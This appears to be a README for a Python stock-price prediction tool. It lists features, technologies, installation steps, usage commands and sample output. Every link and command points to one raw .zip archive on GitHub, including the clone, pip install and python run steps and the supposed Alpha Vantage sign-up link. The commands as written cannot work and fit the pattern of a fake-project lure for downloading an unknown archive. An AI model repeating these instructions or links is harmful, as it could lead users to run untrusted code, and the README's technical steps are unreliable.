## Introduction

In today’s fast-paced financial markets, making informed decisions is crucial. This project focuses on creating a predictive model that can analyze stock data and forecast future prices. The model utilizes historical data to train algorithms, allowing for real-time predictions.

## Features

- **Real-Time Predictions**: Get stock predictions instantly using live data.
- **User-Friendly Interface**: Simple commands make it easy to use.
- **Customizable Models**: Adjust parameters to fit your trading strategy.
- **Data Visualization**: Visualize trends and predictions with graphs.
- **Comprehensive Documentation**: Easy-to-follow guides for setup and usage.

## Technologies Used

This project utilizes a variety of technologies to deliver accurate predictions:

- **Python**: The primary programming language for development.
- **Scikit-Learn**: A machine learning library for building predictive models.
- **Alpha Vantage API**: Provides real-time and historical stock data.
- **Pandas**: For data manipulation and analysis.
- **Statsmodels**: For statistical modeling.
- **Deep Learning Libraries**: Such as TensorFlow or Keras for advanced models.

## Installation

To get started with the Real-Time Stock Predictor, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip
   ```

2. **Navigate to the Directory**:
   ```bash
   cd real-time-stock-predictor
   ```

3. **Install Required Packages**:
   ```bash
   pip install -r https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip
   ```

4. **Set Up Alpha Vantage API Key**:
   Sign up at [Alpha Vantage](https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip) to get your API key. Save it in a `.env` file or directly in the code.

## Usage

To run the stock predictor, execute the following command:

```bash
python https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip
```

You can specify the stock symbol and the time frame for predictions. For example:

```bash
python https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip --symbol AAPL --timeframe 5d
```

### Example Commands

- Predict the next price for Apple Inc. (AAPL):
  ```bash
  python https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip --symbol AAPL
  ```

- Visualize predictions for Tesla Inc. (TSLA):
  ```bash
  python https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip --symbol TSLA --visualize
  ```

## How It Works

The Real-Time Stock Predictor operates by following these steps:

1. **Data Collection**: It retrieves stock data from the Alpha Vantage API.
2. **Data Preprocessing**: Cleans and formats the data for analysis.
3. **Model Training**: Uses historical data to train machine learning models.
4. **Prediction**: Generates predictions based on the latest data.
5. **Visualization**: Displays trends and predictions through graphs.

### Data Flow

1. **Input**: User specifies the stock symbol and parameters.
2. **Processing**: The system fetches and processes the data.
3. **Output**: The model returns predictions and visualizations.

### Sample Output

After running the predictor, you might see an output like this:

```
Predicted Price for AAPL: $150.25
```

You can also view graphs showing historical prices and predictions.
